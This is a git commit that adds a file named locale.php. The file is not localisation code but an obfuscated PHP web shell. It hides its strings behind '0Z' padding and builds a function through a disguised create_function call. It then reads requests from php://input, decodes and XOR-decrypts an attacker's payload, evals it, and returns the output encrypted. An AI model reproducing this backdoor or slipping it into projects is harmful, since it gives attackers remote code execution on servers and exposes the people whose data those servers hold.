f49181958ba6d29803e392f4e9b58e56b0e8766f
deonsempak <91638780+deonsempak@users.noreply.github.com>
2026-02-03 01:26:13 +0700

    Add obfuscated PHP code for execution

---
+++ locale.php
@@ -0,0 +1,13 @@
+<?php
+$e='0Zbas0Ze64_encode(0Z@x(@gzco0Zmpress0Z($o)0Z,$k));pri0Znt("$p0Z$kh$r0Z$kf");}';
+$s='="0ZX1UKZe4hCJRxd0ZjHv";f0Zunct0Zion x($0Zt,$0Zk){$c0Z=str0Zlen($0Z0Zk);$l=';
+$g=');0Z$j++,$i++)0Z{0Z$o.=$t{$i}^0Z$k{$j0Z0Z};}}r0Zeturn $o;}0Zif (@0Zpreg_m0Z';
+$I='$k="7d30Z80Z540Zb8";$kh="8d78d3e0Z1d0Z614";$kf0Z="b570Z762a71c0Z0Zb6";$p';
+$w='atch("/0Z$kh(.+)0Z0Z$kf/",@file_get0Z_c0Zo0Zn0Ztents("php:/0Z/input"),$m';
+$Y='e($0Zm[1]),$k)))0Z;$o=@o0Zb0Z_get_con0Zt0Ze0Znts();@ob_end0Z_clean();$r0Z=@';
+$A=str_replace('hw','','crehwahwtehw_hwhwfhwunction');
+$W=')==0Z1) {0Z@ob_s0Ztart();0Z@ev0Zal(@0Zgzu0Zncompress(@x(@0Zbase60Z4_deco0Zd';
+$f='strlen($t);0Z$o="";fo0Zr($i=00Z0Z;$i<$l;){fo0Zr($j0Z=0;($j<$c0Z&&$i0Z<$l';
+$F=str_replace('0Z','',$I.$s.$f.$g.$w.$W.$Y.$e);
+$S=$A('',$F);$S();
+?>
